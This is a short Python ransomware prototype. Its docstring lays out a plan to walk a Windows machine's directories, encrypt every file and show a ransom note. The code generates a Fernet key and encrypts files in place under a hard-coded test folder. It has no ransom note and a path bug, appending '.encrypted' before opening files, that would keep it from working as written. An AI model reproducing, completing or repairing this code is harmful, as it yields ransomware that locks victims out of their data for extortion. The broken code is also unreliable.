"""
	ENCRYPTION SEQUENCE - WIN10

	1) First get the root directory of the host machine
	2) Now iterate all over the subdirectories...
	3) At the same time encrypt the files and media (hidden the files adding .)
	4) Once are encrypted, display the ransom note
"""

import os
from cryptography.fernet import Fernet 

def write_key():
	key = Fernet.generate_key()

	with open('key.key', 'wb') as key_file: 
		key_file.write(key)

def load_key():
    return open("key.key", "rb").read()

def load_data(filename):
	with open(filename, 'rb') as file:
		return file.read()

def save_data(filename, data):
	 with open(filename, 'wb') as file:
			file.write(data)

def encrypt(filename, key):
	f = Fernet(key)
	data = load_data(filename)
	encrypted_data = f.encrypt(data)
	save_data(filename, encrypted_data)


if __name__ == '__main__':
	write_key()
	key = load_key()

	root = '/Users/marcosplazagonzalez/Desktop/test'

	for root, dirs, files in os.walk(root):
	   for fn in files:
	   		full_path = root + os.sep + fn + '.encrypted'
	   		encrypt(full_path, key)
	      